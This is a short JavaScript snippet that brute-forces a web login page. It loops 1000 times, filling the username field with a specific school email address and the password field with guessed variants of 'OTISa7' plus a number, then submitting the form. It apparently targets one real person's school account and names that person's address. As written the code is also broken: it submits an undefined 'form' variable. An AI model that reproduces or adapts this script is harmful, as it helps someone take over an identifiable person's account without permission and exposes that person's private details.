const loginForm = document.getElementById("logon")
const usernameBox = document.getElementById("j_username")
const passwordBox = document.getElementById("j_password")

for (let i=0; i < 1000; i++) {
  usernameBox.value = "26ponirosa@oceanschools.org"
  passwordBox.value = "OTISa7" + i + "p"

  form.requestSubmit();
}


